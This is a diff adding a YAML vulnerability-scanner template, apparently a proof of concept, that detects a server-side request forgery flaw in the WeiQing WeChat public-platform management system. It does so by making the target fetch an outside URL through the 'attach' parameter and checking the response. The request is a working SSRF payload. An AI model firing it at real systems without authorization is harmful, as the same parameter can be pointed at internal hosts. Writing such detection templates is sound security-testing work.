@@ -1,0 +1,16 @@
+id: poc-yaml-weiqing-wechat-ssrf
+info:
+  name: WeiQing 微信公共平台管理系统 SSRF 漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: WeiQing
+  osprey-id: vb_2021_0059
+requests:
+- method: GET
+  path: /web/index.php?c=utility&a=wxcode&do=image&attach=http://www.baidu.com/
+  expression: 'status_code == 200 && contains(body, "<title>百度一下，你就知道</title>")
+
+    '
+variables: {}
+transport: http
